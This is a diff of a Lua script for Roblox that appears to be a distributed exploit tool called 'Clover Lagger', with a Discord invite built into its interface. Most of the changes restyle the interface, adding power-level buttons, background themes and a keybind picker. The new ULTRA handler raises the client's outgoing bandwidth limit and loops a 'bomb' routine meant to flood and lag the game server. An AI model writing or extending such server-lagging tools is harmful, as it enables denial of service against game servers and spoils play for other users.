+    task.wait(0.32)
+
+    introFrame:Destroy()
+    mainFrame.Visible = true
+    task.spawn(showUltraAlerts)
 end)
-actualizarCandado()
 
--- "LAGGER"
+-- imagen de fondo
+backgroundImage = Instance.new("ImageLabel")
+backgroundImage.Name = "BackgroundImage"
+backgroundImage.Parent = mainFrame
+backgroundImage.BackgroundTransparency = 1
+backgroundImage.BorderSizePixel = 0
+backgroundImage.Position = UDim2.new(0,0,0,0)
+backgroundImage.Size = UDim2.new(1,0,1,0)
+backgroundImage.Image = selectedBackground ~= "" and ("rbxassetid://" .. selectedBackground) or ""
+backgroundImage.BackgroundColor3 = Color3.fromRGB(0,0,0)
+backgroundImage.BackgroundTransparency = selectedBackground ~= "" and 1 or 0
+backgroundImage.ScaleType = Enum.ScaleType.Crop
+backgroundImage.ZIndex = 1
+Instance.new("UICorner", backgroundImage).CornerRadius = UDim.new(0,20)
+
+-- titulo solo Clover Lagger
+titleLabel = Instance.new("TextLabel", mainFrame)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0,18,0,8)
+titleLabel.Size = UDim2.new(1,-85,0,24)
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.Text = "Clover Lagger"
+titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
+titleLabel.TextSize = 20
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+titleLabel.ZIndex = 5
+
+separatorLine = Instance.new("Frame")
+separatorLine.Parent = mainFrame
+separatorLine.BackgroundColor3 = Color3.fromRGB(255,255,255)
+separatorLine.BorderSizePixel = 0
+separatorLine.Position = UDim2.new(0,18,0,36)
+separatorLine.Size = UDim2.new(1,-36,0,1)
+separatorLine.ZIndex = 4
+
+-- discord abajito de la linea
+discordLabel = Instance.new("TextLabel", mainFrame)
+discordLabel.BackgroundTransparency = 1
+discordLabel.Position = UDim2.new(0,18,0,39)
+discordLabel.Size = UDim2.new(1,-36,0,14)
+discordLabel.Font = Enum.Font.GothamBold
+discordLabel.Text = "discord.gg/rPBGzppDam"
+discordLabel.TextColor3 = Color3.fromRGB(200,200,200)
+discordLabel.TextSize = 9
+discordLabel.TextXAlignment = Enum.TextXAlignment.Left
+discordLabel.ZIndex = 5
+
 textLagger = Instance.new("TextLabel", mainFrame)
 textLagger.BackgroundTransparency = 1
-textLagger.Position = UDim2.new(0, 5, 0, 50)
-textLagger.Size = UDim2.new(0, 100, 0, 30)
+textLagger.Position = UDim2.new(0,25,0,66)
+textLagger.Size = UDim2.new(0,90,0,18)
 textLagger.Font = Enum.Font.GothamBlack
-textLagger.Text = "LAGGER"
-textLagger.TextColor3 = Color3.fromRGB(220, 200, 255)
-textLagger.TextSize = 14
+textLagger.Text = "POWER"
+textLagger.TextColor3 = Color3.fromRGB(255,255,255)
+textLagger.TextSize = 12
 textLagger.TextXAlignment = Enum.TextXAlignment.Left
 textLagger.TextYAlignment = Enum.TextYAlignment.Center
-textLagger.ZIndex = 2
+textLagger.ZIndex = 5
 
--- SWITCH
-toggleContainer = Instance.new("Frame", mainFrame)
-toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
-toggleContainer.Position = UDim2.new(1, -145, 0, 50)
-toggleContainer.Size = UDim2.new(0, 60, 0, 30)
-toggleContainer.ZIndex = 2
-Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)
+powerStatus = Instance.new("TextLabel", mainFrame)
+powerStatus.BackgroundTransparency = 1
+powerStatus.Position = UDim2.new(0,210,0,66)
+powerStatus.Size = UDim2.new(0,80,0,18)
+powerStatus.Font = Enum.Font.GothamBold
+powerStatus.Text = ""
+powerStatus.TextColor3 = Color3.fromRGB(255,255,255)
+powerStatus.TextSize = 10
+powerStatus.TextXAlignment = Enum.TextXAlignment.Right
+powerStatus.ZIndex = 5
 
-toggleBall = Instance.new("Frame", toggleContainer)
-toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
-toggleBall.Size = UDim2.new(0, 24, 0, 24)
-toggleBall.Position = UDim2.new(0, 4, 0.5, -12)
-toggleBall.ZIndex = 2
-Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)
+toggleButton = Instance.new("TextButton", mainFrame)
+toggleButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+toggleButton.Position = UDim2.new(0.5,-67,0,186)
+toggleButton.Size = UDim2.new(0,134,0,28)
+toggleButton.Font = Enum.Font.GothamBlack
+toggleButton.Text = "INACTIVE"
+toggleButton.TextSize = 13
+toggleButton.TextColor3 = Color3.fromRGB(255,255,255)
+toggleButton.TextXAlignment = Enum.TextXAlignment.Center
+toggleButton.TextYAlignment = Enum.TextYAlignment.Center
+toggleButton.ZIndex = 5
+toggleButton.AutoButtonColor = false
+toggleButton.BorderSizePixel = 1
+toggleButton.BorderColor3 = Color3.fromRGB(255,255,255)
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(1,0)
+toggleButton.MouseButton1Click:Connect(toggleLagger)
 
-toggleClick = Instance.new("TextButton", toggleContainer)
-toggleClick.BackgroundTransparency = 0
-toggleClick.BackgroundColor3 = Color3.fromRGB(70, 50, 100)
-toggleClick.Size = UDim2.new(1,0,1,0)
-toggleClick.ZIndex = 3
-toggleClick.Font = Enum.Font.GothamBlack
-toggleClick.Text = "INACTIVE"
-toggleClick.TextSize = 8
-toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
-toggleClick.TextXAlignment = Enum.TextXAlignment.Center
-toggleClick.TextYAlignment = Enum.TextYAlignment.Center
-toggleClick.MouseButton1Click:Connect(toggleLagger)
-toggleClick.AutoButtonColor = false
-local corner = Instance.new("UICorner", toggleClick)
-corner.CornerRadius = UDim.new(1,0)
+colorThemeLabel = Instance.new("TextLabel")
+colorThemeLabel.Parent = mainFrame
+colorThemeLabel.BackgroundTransparency = 1
+colorThemeLabel.Position = UDim2.new(0,25,0,126)
+colorThemeLabel.Size = UDim2.new(0,105,0,22)
+colorThemeLabel.Font = Enum.Font.GothamBold
+colorThemeLabel.Text = "Color Theme:"
+colorThemeLabel.TextColor3 = Color3.fromRGB(255,255,255)
+colorThemeLabel.TextSize = 13
+colorThemeLabel.TextXAlignment = Enum.TextXAlignment.Left
+colorThemeLabel.ZIndex = 5
 
--- SELECTOR DE TECLA
-keybindButton.MouseButton1Click:Connect(function()
-    if listeningForInput then return end
-    listeningForInput = true
-    keybindButton.Text = "KEY: ..."
-    keybindButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
-    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
+noneButton = Instance.new("TextButton")
+noneButton.Parent = mainFrame
+noneButton.Name = "NoneButton"
+noneButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+noneButton.BorderSizePixel = 1
+noneButton.BorderColor3 = Color3.fromRGB(255,255,255)
+noneButton.Position = UDim2.new(0,125,0,124)
+noneButton.Size = UDim2.new(0,64,0,24)
+noneButton.Font = Enum.Font.GothamBold
+noneButton.Text = "NONE"
+noneButton.TextColor3 = Color3.fromRGB(255,255,255)
+noneButton.TextSize = 11
+noneButton.AutoButtonColor = false
+noneButton.ZIndex = 6
+Instance.new("UICorner", noneButton).CornerRadius = UDim.new(0,5)
+
+backgroundPanel = Instance.new("Frame")
+backgroundPanel.Parent = mainFrame
+backgroundPanel.Name = "BackgroundPanel"
+backgroundPanel.BackgroundColor3 = Color3.fromRGB(0,0,0)
+backgroundPanel.BorderSizePixel = 1
+backgroundPanel.BorderColor3 = Color3.fromRGB(255,255,255)
+backgroundPanel.Position = UDim2.new(0,25,0,154)
+backgroundPanel.Size = UDim2.new(1,-50,0,54)
+backgroundPanel.Visible = false
+backgroundPanel.ZIndex = 30
+Instance.new("UICorner", backgroundPanel).CornerRadius = UDim.new(0,7)
+
+local backgroundGrid = Instance.new("UIGridLayout")
+backgroundGrid.Parent = backgroundPanel
+backgroundGrid.CellSize = UDim2.new(0,44,0,42)
+backgroundGrid.CellPadding = UDim2.new(0,6,0,0)
+backgroundGrid.FillDirectionMaxCells = 5
+backgroundGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
+backgroundGrid.VerticalAlignment = Enum.VerticalAlignment.Center
+
+local backgroundOptions = {
+    {name="1", id="118617315584575"},
+    {name="2", id="130476358343147"},
+    {name="3", id="116149678710819"},
+    {name = "4", id = "117184786207362"},
+    {name = "5", id = ""},
+}
+
+local bgButtons = {}
+for index, option in ipairs(backgroundOptions) do
+    local preview = Instance.new("ImageButton")
+    preview.Name = "Background" .. option.name
+    preview.Parent = backgroundPanel
+    preview.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    preview.BorderSizePixel = 1
+    preview.BorderColor3 = Color3.fromRGB(255,255,255)
+    preview.Image = option.id ~= "" and ("rbxassetid://" .. option.id) or ""
+    preview.ScaleType = Enum.ScaleType.Crop
+    preview.AutoButtonColor = false
+    preview.LayoutOrder = index
+    preview.ZIndex = 31
+    Instance.new("UICorner", preview).CornerRadius = UDim.new(0,5)
+
+    local label = Instance.new("TextLabel")
+    label.Parent = preview
+    label.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    label.BorderSizePixel = 0
+    label.Position = UDim2.new(0,0,1,-13)
+    label.Size = UDim2.new(1,0,0,13)
+    label.Font = Enum.Font.GothamBold
+    label.Text = option.name
+    label.TextColor3 = Color3.fromRGB(255,255,255)
+    label.TextSize = 8
+    label.ZIndex = 32
+
+    table.insert(bgButtons,{button=preview,id=option.id})
+
+    preview.MouseButton1Click:Connect(function()
+        selectedBackground = option.id
+        backgroundImage.Image = option.id ~= "" and ("rbxassetid://" .. option.id) or ""
+        backgroundImage.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        if option.id ~= "" then
+            backgroundImage.BackgroundTransparency = 1
+        else
+            backgroundImage.BackgroundTransparency = 0
+        end
+        SaveConfig()
+        for _, entry in ipairs(bgButtons) do
+            local active = entry.id == selectedBackground
+            entry.button.BackgroundColor3 = active and Color3.fromRGB(255,255,255) or Color3.fromRGB(0,0,0)
+            entry.button.BorderSizePixel = active and 0 or 1
+            entry.button.BorderColor3 = Color3.fromRGB(255,255,255)
+        end
+    end)
+end
+
+for _, entry in ipairs(bgButtons) do
+    local active = entry.id == selectedBackground
+    entry.button.BackgroundColor3 = active and Color3.fromRGB(255,255,255) or Color3.fromRGB(0,0,0)
+    entry.button.BorderSizePixel = active and 0 or 1
+    entry.button.BorderColor3 = Color3.fromRGB(255,255,255)
+end
+
+noneButton.MouseButton1Click:Connect(function()
+    backgroundPanel.Visible = not backgroundPanel.Visible
+    if backgroundPanel.Visible then
+        noneButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
+        noneButton.TextColor3 = Color3.fromRGB(0,0,0)
+        noneButton.BorderSizePixel = 0
+    else
+        noneButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        noneButton.TextColor3 = Color3.fromRGB(255,255,255)
+        noneButton.BorderSizePixel = 1
+        noneButton.BorderColor3 = Color3.fromRGB(255,255,255)
+    end
 end)
 
-local inputConnection
-inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
-    if not listeningForInput then return end
-    if gp then return end
-
-    local newKey = nil
-    if input.KeyCode ~= Enum.KeyCode.Unknown then
-        newKey = input.KeyCode
-    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
-        newKey = input.KeyCode
-    end
-
-    if newKey then
-        keybind = newKey
-        actualizarKeybindButton()
-        listeningForInput = false
-        keybindButton.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
-        keybindButton.BackgroundTransparency = 0.1
-        keybindButton.TextColor3 = Color3.fromRGB(220, 200, 255)
-    end
-end)
-
--- BOTONES LOW/MID/HIGH
-local btnY = 90
-local btnW = 80
-local btnH = 35
+-- botones vista normal
+local btnY = 88
+local btnW = 64
+local btnH = 31
 local espaciado = 8
-local margenIzq = 5
+local margenIzq = 25
 
 btnLow = Instance.new("TextButton", mainFrame)
+btnLow_ref = btnLow
 btnLow.Size = UDim2.new(0, btnW, 0, btnH)
 btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
-btnLow.Font = UI_CONFIG.Font
+btnLow.Font = Enum.Font.GothamBlack
 btnLow.Text = "LOW"
-btnLow.TextColor3 = Color3.fromRGB(220, 200, 255)
-btnLow.TextSize = 13
+btnLow.TextColor3 = Color3.fromRGB(255,255,255)
+btnLow.TextSize = 10
 btnLow.AutoButtonColor = false
-btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnLow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 btnLow.BorderSizePixel = 1
-btnLow.BorderColor3 = UI_CONFIG.BorderColor
-btnLow.ZIndex = 2
-Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 8)
+btnLow.BorderColor3 = Color3.fromRGB(255,255,255)
+btnLow.ZIndex = 5
+Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 5)
 btnLow.MouseButton1Click:Connect(function()
     nivelActual = "Low"
     actualizarBotonesNivel()
@@ -398,18 +815,19 @@ btnLow.MouseButton1Click:Connect(function()
 end)
 
 btnMid = Instance.new("TextButton", mainFrame)
+btnMid_ref = btnMid
 btnMid.Size = UDim2.new(0, btnW, 0, btnH)
 btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
-btnMid.Font = UI_CONFIG.Font
+btnMid.Font = Enum.Font.GothamBlack
 btnMid.Text = "MID"
-btnMid.TextColor3 = Color3.fromRGB(220, 200, 255)
-btnMid.TextSize = 13
+btnMid.TextColor3 = Color3.fromRGB(255,255,255)
+btnMid.TextSize = 10
 btnMid.AutoButtonColor = false
-btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnMid.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 btnMid.BorderSizePixel = 1
-btnMid.BorderColor3 = UI_CONFIG.BorderColor
-btnMid.ZIndex = 2
-Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 8)
+btnMid.BorderColor3 = Color3.fromRGB(255,255,255)
+btnMid.ZIndex = 5
+Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 5)
 btnMid.MouseButton1Click:Connect(function()
     nivelActual = "Mid"
     actualizarBotonesNivel()
@@ -417,28 +835,184 @@ btnMid.MouseButton1Click:Connect(function()
 end)
 
 btnHigh = Instance.new("TextButton", mainFrame)
+btnHigh_ref = btnHigh
 btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
 btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
-btnHigh.Font = UI_CONFIG.Font
+btnHigh.Font = Enum.Font.GothamBlack
 btnHigh.Text = "HIGH"
-btnHigh.TextColor3 = Color3.fromRGB(220, 200, 255)
-btnHigh.TextSize = 13
+btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
+btnHigh.TextSize = 10
 btnHigh.AutoButtonColor = false
-btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+btnHigh.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 btnHigh.BorderSizePixel = 1
-btnHigh.BorderColor3 = UI_CONFIG.BorderColor
-btnHigh.ZIndex = 2
-Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 8)
+btnHigh.BorderColor3 = Color3.fromRGB(255,255,255)
+btnHigh.ZIndex = 5
+Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 5)
 btnHigh.MouseButton1Click:Connect(function()
     nivelActual = "High"
     actualizarBotonesNivel()
     SaveConfig()
 end)
 
+btnUltra = Instance.new("TextButton", mainFrame)
+btnUltra_ref = btnUltra
+btnUltra.Size = UDim2.new(0, btnW, 0, btnH)
+btnUltra.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
+btnUltra.Font = Enum.Font.GothamBlack
+btnUltra.Text = "ULTRA"
+btnUltra.TextColor3 = Color3.fromRGB(255,255,255)
+btnUltra.TextSize = 10
+btnUltra.AutoButtonColor = false
+btnUltra.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+btnUltra.BorderSizePixel = 1
+btnUltra.BorderColor3 = Color3.fromRGB(255,255,255)
+btnUltra.ZIndex = 5
+Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0, 5)
+btnUltra.MouseButton1Click:Connect(function()
+    if nivelActual == "Ultra" then return end
+    nivelActual = "Ultra"
+    actualizarBotonesNivel()
+    SaveConfig()
+
+    if not laggerActive then
+        laggerActive = true
+        actualizarSwitch()
+        if lagThread then task.cancel(lagThread) end
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+                bomb(NIVELES[nivelActual].poder)
+                task.wait(0.18)
+            end
+        end)
+    else
+        restartLagWithPower(NIVELES[nivelActual].poder)
+    end
+end)
+
+-- la tecla pra activar
+keyLabel = Instance.new("TextLabel", mainFrame)
+keyLabel.BackgroundTransparency = 1
+keyLabel.Position = UDim2.new(0,205,0,126)
+keyLabel.Size = UDim2.new(0,40,0,22)
+keyLabel.Font = Enum.Font.GothamBold
+keyLabel.Text = "KEY"
+keyLabel.TextColor3 = Color3.fromRGB(255,255,255)
+keyLabel.TextSize = 13
+keyLabel.TextXAlignment = Enum.TextXAlignment.Left
+keyLabel.ZIndex = 6
+
+keyButton = Instance.new("TextButton", mainFrame)
+keyButton.Name = "KeyButton"
+keyButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+keyButton.BorderSizePixel = 1
+keyButton.BorderColor3 = Color3.fromRGB(255,255,255)
+keyButton.Position = UDim2.new(0,244,0,124)
+keyButton.Size = UDim2.new(0,46,0,24)
+keyButton.Font = Enum.Font.GothamBold
+keyButton.Text = keyBind
+keyButton.TextColor3 = Color3.fromRGB(255,255,255)
+keyButton.TextSize = 11
+keyButton.AutoButtonColor = false
+keyButton.ZIndex = 6
+Instance.new("UICorner", keyButton).CornerRadius = UDim.new(0,5)
+
+keyButton.MouseButton1Click:Connect(function()
+    waitingForKey = true
+    keyButton.Text = "..."
+    keyButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    keyButton.TextColor3 = Color3.fromRGB(0,0,0)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
+        local newKey = input.KeyCode.Name
+        if newKey ~= "Unknown" and newKey ~= "Escape" then
+            keyBind = newKey
+            waitingForKey = false
+            keyButton.Text = keyBind
+            keyButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+            keyButton.TextColor3 = Color3.fromRGB(255,255,255)
+            SaveConfig()
+        elseif newKey == "Escape" then
+            waitingForKey = false
+            keyButton.Text = keyBind
+            keyButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+            keyButton.TextColor3 = Color3.fromRGB(255,255,255)
+        end
+        return
+    end
+
+    if not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard then
+        local pressedKey = input.KeyCode.Name
+        if pressedKey == keyBind then
+            toggleLagger()
+        end
+    end
+end)
+
+infoLabel = Instance.new("TextLabel", mainFrame)
+infoLabel.BackgroundTransparency = 1
+infoLabel.Position = UDim2.new(0,0,0,176)
+infoLabel.Size = UDim2.new(1,0,0,12)
+infoLabel.Font = Enum.Font.GothamBlack
+infoLabel.Text = ""
+infoLabel.TextColor3 = COLORES.Low
+infoLabel.TextSize = 8
+infoLabel.TextXAlignment = Enum.TextXAlignment.Center
+infoLabel.TextYAlignment = Enum.TextYAlignment.Top
+infoLabel.ZIndex = 5
+
 actualizarBotonesNivel()
 actualizarSwitch()
 
--- ARRASTRAR
+-- funcion hide y show
+hideShowButton.MouseButton1Click:Connect(function()
+    uiVisible = not uiVisible
+    if uiVisible then
+        hideShowButton.Text = "Hide"
+        miniBarContainer.Visible = false
+        
+        if textLagger then textLagger.Visible = true end
+        if powerStatus then powerStatus.Visible = true end
+        if toggleButton then toggleButton.Visible = true end
+        if colorThemeLabel then colorThemeLabel.Visible = true end
+        if noneButton then noneButton.Visible = true end
+        if keyLabel then keyLabel.Visible = true end
+        if keyButton then keyButton.Visible = true end
+        if separatorLine then separatorLine.Visible = true end
+        if discordLabel then discordLabel.Visible = true end
+        if btnLow_ref then btnLow_ref.Visible = true end
+        if btnMid_ref then btnMid_ref.Visible = true end
+        if btnHigh_ref then btnHigh_ref.Visible = true end
+        if btnUltra_ref then btnUltra_ref.Visible = true end
+        
+        mainFrame.Size = UDim2.new(0, 316, 0, 225)
+    else
+        hideShowButton.Text = "Show"
+        
+        if textLagger then textLagger.Visible = false end
+        if powerStatus then powerStatus.Visible = false end
+        if toggleButton then toggleButton.Visible = false end
+        if colorThemeLabel then colorThemeLabel.Visible = false end
+        if noneButton then noneButton.Visible = false end
+        if backgroundPanel then backgroundPanel.Visible = false end
+        if keyLabel then keyLabel.Visible = false end
+        if keyButton then keyButton.Visible = false end
+        if separatorLine then separatorLine.Visible = false end
+        if discordLabel then discordLabel.Visible = false end
+        if btnLow_ref then btnLow_ref.Visible = false end
+        if btnMid_ref then btnMid_ref.Visible = false end
+        if btnHigh_ref then btnHigh_ref.Visible = false end
+        if btnUltra_ref then btnUltra_ref.Visible = false end
+        
+        miniBarContainer.Visible = true
+        actualizarBotonesNivel()
+        mainFrame.Size = UDim2.new(0, 316, 0, 126)
+    end
+end)
+
+-- mover la pantalla
 local isDragging, dragStart, startPos = false, nil, nil
 mainFrame.InputBegan:Connect(function(input)
     if ventanaBloqueada then return end
@@ -460,13 +1034,3 @@ mainFrame.InputEnded:Connect(function(input)
         isDragging = false
     end
 end)
-
--- ðŸŽ® ACTIVACIÃ“N CON LA TECLA SELECCIONADA
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
-        toggleLagger()
-    end
-end)
-
-print("[Violencia Lagger] Loaded! Press M to toggle")
